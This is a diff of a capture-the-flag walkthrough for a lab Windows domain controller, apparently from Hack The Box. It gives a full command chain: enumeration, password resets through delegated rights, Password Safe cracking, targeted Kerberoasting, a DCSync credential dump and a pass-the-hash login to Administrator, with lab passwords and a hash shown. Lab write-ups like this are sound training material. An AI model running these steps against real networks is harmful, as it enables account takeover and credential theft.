@@ -3,198 +3,249 @@
 **IP Address:** `10.10.11.42`  
 **OS:** Windows  
 **Difficulty:** Hard  
-**Tags:** #SMB, #WinRM, #BloodHound, #ShadowCredentials, #RPC, #PasswordCracking, 
-#DCSync
+**Tags:** #SMB, #WinRM, #BloodHound, #ShadowCredentials, #RPC, #PasswordCracking, #DCSync, #Kerberoast
 
 ---
 
 ## 1. Initial Enumeration
 
-### 1.1 Ping
+### 1.1 Host Discovery
 
 ```bash
 ping 10.10.11.42
 ```
 
-✅ Host is up
+✅ Host is alive.
 
 ---
 
 ### 1.2 Port Scanning
 
-Basic port scan:
+Initial full TCP port scan:
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.42 -oG allPorts
 ```
 
-Deeper scan with script and XML output:
+Identified several open ports. Followed by a detailed targeted scan with script and version detection:
 
 ```bash
 nmap -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,51918,54283,54288,54302,54310 -sCV 10.10.11.42 -oN targeted -oX targetedXML
 ```
 
+Exported results to XML for later web-based analysis — a technique I hadn’t used before and found helpful for clarity.
+
 ---
 
 ## 2. SMB and WinRM Access
+
+Started with classic enumeration via CrackMapExec:
 
 ```bash
 crackmapexec smb 10.10.11.42
 ```
 
-Edit `/etc/hosts` to map the domain:
+Added the machine name to `/etc/hosts`:
 
 ```
 10.10.11.42 administrator.htb
 ```
 
-Verified user login with NetExec:
+Used NetExec (modern CrackMapExec fork) for further enumeration:
 
 ```bash
+netexec smb 10.10.11.42 --shares
 netexec smb 10.10.11.42 -u olivia -p ichliebedich
 ```
 
-Login success, but user is not in the **Remote Management Users** group.
+✅ Valid credentials for `olivia`, but:
 
-However, WinRM is open:
+- Not a member of Remote Management Users → No RCE via SMB
+    
+- No shared folders available
+    
+
+Tried WinRM instead:
+
+```bash
+netexec winrm 10.10.11.42 -u olivia -p ichliebedich
+```
+
+✅ Login successful → Shell access via Evil-WinRM:
 
 ```bash
 evil-winrm -i 10.10.11.42 -u olivia -p 'ichliebedich'
 ```
 
-✅ Access as `olivia`
-
 ---
 
-## 3. Enumeration
+## 3. User Enumeration and RPC Abuse
 
-List users:
+Inside the WinRM shell, listed domain users:
 
 ```bash
 net user
 ```
 
-RPC enumeration using Olivia’s credentials:
+Tried to enumerate with `rpcclient` anonymously:
+
+```bash
+rpcclient -U "" 10.10.11.42 -N
+```
+
+❌ Failed. Retried with valid credentials:
 
 ```bash
 rpcclient -U "olivia%ichliebedich" 10.10.11.42
 ```
 
-Dump domain users:
+✅ Success.
+
+- Enumerated domain users and groups with `enumdomusers`, `enumdomgroups`
+    
+
+Dumped domain users:
 
 ```bash
 rpcclient -U "olivia%ichliebedich" 10.10.11.42 -c 'enumdomusers' > users.txt
-cat users.txt | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sponge users.txt
+cat users.txt | grep -oP '\\[.*?\\]' | grep -v "0x" | tr -d '[]' | sponge users.txt
 ```
 
-Checked AS-REP roasting:
+→ Cleaned with regex and `sponge` for clarity.
+
+Attempted AS-REP Roasting:
 
 ```bash
 GetNPUsers.py -no-pass -usersfile users.txt administrator.htb/
 ```
 
-No users were vulnerable.
+❌ No users vulnerable.  
+Tried again with valid Olivia credentials → still no success.
 
 ---
 
-## 4. BloodHound + LDAPDomainDump
+## 4. LDAP and BloodHound Enumeration
 
-Install BloodHound:
+While waiting for BloodHound setup, dumped LDAP data:
+
+```bash
+ldapdomaindump -u 'administrator.htb\\olivia' -p ichliebedich 10.10.11.42
+```
+
+Started a Python web server to browse the dump:
+
+```bash
+python3 -m http.server 80
+```
+
+Opened `domain_users.html`, `Remote Management Users.html`, reviewed domain structure.
+
+Installed BloodHound CLI:
 
 ```bash
 wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
-tar -xvzf bloodhound-cli-linux-amd64.tar.gz
-./bloodhound-cli install
 ```
-
-Dump LDAP data:
 
 ```bash
-ldapdomaindump -u 'administrator.htb\olivia' -p ichliebedich 10.10.11.42
+tar -xvzf bloodhound-cli-linux-amd64.tar.gz
 ```
 
-Access domain HTML data via a local web server.
+```bash
+sudo ./bloodhound-cli install
+```
 
-Collect BloodHound data:
+Collected BloodHound data with:
 
 ```bash
 bloodhound-python -u 'olivia' -p 'ichliebedich' -c All --zip -ns 10.10.11.42 -d administrator.htb
 ```
 
-Discovered a **GenericAll** relationship from `olivia` to `michael`.
+Visualized paths → `olivia` has **GenericAll** on `michael`.
 
 ---
 
-## 5. Lateral Movement
+## 5. Lateral Movement to `michael`
 
-Change `michael`’s password via NetExec or RPC:
+Used password reset attack (ForceChangePassword) recommended by BloodHound:
 
 ```bash
 net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
 ```
 
-Used BloodHound to confirm `michael` can reset `benjamin`’s password as well:
+✅ Successfully reset password.
+
+BloodHound shows `michael` has GenericAll over `benjamin`. Repeated attack:
 
 ```bash
 net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"newP@ssword2022" -S 10.10.11.42
 ```
 
+✅ Password reset success. However:
+
+- `benjamin` ∉ Remote Management Users
+    
+- Belongs to `Share Moderators`
+    
+
 ---
 
-## 6. File Access via SMB and FTP
+## 6. Access via SMB and FTP
 
-Access shared files using `benjamin`:
+Used `smbmap` for recursive file listing:
 
 ```bash
 smbmap -H 10.10.11.42 -u benjamin -p 'newP@ssword2022' -r
 ```
 
-Discovered interesting file via FTP:
+Nothing useful from SMB. Tried FTP with same credentials:
 
 ```bash
 ftp 10.10.11.42
-get Backup.psafe3
 ```
 
-The file is a **Password Safe** database.
+✅ Found and downloaded `Backup.psafe3`.
 
 ---
 
-## 7. Cracking Password Safe
+## 7. Cracking the Password Safe
 
-Used `pwsafe`:
+Identified file as Password Safe DB. Used CLI utility:
 
 ```bash
 pwsafe Backup.psafe3
 ```
 
-Extracted hash using `pwsafe2john` and cracked with rockyou:
+❌ Prompted for password.
+
+Extracted hash with `pwsafe2john`, then cracked with rockyou:
 
 ```bash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-✅ Password: `tekieromucho`
+✅ Cracked password: `tekieromucho`
 
-Logged into pwsafe and found credentials for user `emily`.
+Accessed safe and recovered passwords of 3 users. Most interesting: `emily`.
 
 ---
 
-## 8. Privilege Escalation via Kerberoasting
+## 8. PrivEsc with `emily` via Kerberoasting
 
-Logged in as `emily` via WinRM:
+Logged in with Evil-WinRM as `emily`:
 
 ```bash
 evil-winrm -i 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 ```
 
-Used **targetedKerberoast.py**:
+BloodHound → `emily` has relation with `ethan`.
+
+Used Targeted Kerberoast attack:
 
 ```bash
 python3 targetedKerberoast.py -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --dc-ip 10.10.11.42
 ```
 
-Cracked Ethan's TGS hash:
+✅ Retrieved `ethan` TGS hash. Cracked it:
 
 ```bash
 john hash_ethan --wordlist=/usr/share/wordlists/rockyou.txt
@@ -204,24 +255,25 @@ john hash_ethan --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---
 
-## 9. DCSync Attack → Domain Admin
+## 9. DCSync Attack as Domain Admin
 
-Performed DCSync using Ethan’s credentials:
+BloodHound → `ethan` can perform DCSync.
+
+Executed:
 
 ```bash
 secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
 ```
 
-✅ Retrieved Administrator NTLM hash
+✅ Dumped `Administrator` NTLM hash.
 
-Logged in as Administrator:
+Logged in:
 
 ```bash
 evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
 ```
 
-✅ Root access obtained  
-🏁 **Root flag retrieved**
+🏁 Root shell obtained.
 
 ---
 
